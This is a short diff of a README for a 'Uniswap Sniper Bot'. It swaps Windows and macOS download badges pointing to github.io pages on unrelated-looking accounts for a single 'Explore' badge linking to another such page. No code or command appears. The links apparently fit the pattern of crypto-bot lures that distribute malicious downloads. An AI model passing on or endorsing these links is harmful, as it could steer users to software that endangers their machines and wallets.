@@ -8,15 +8,8 @@
 
 <div align="center">
 
-[![GET for Windows](https://img.shields.io/badge/GET_for_Windows-💻-blue?style=for-the-badge&logo=windows)](https://uniswap-sniper-bot-toolkit.github.io/.github/)
-[![GET for macOS](https://img.shields.io/badge/GET_for_macOS-🍏-green?style=for-the-badge&logo=apple)](https://junimata-orex.github.io/.github/uniswap-sniper-bot)
-</div>
+[![Explore Uniswap Sniper Bot](https://img.shields.io/badge/Explore-Uniswap%20Sniper%20Bot-7C3AED?style=flat-square)](https://research-uniswap.github.io/.github/)
 
-<div align="center">
-
-![Order & Monitoring Illustration](https://mizar.com/_next/static/media/order-management-img.50e74f63.svg)
-
-</div>
 
 ---
 
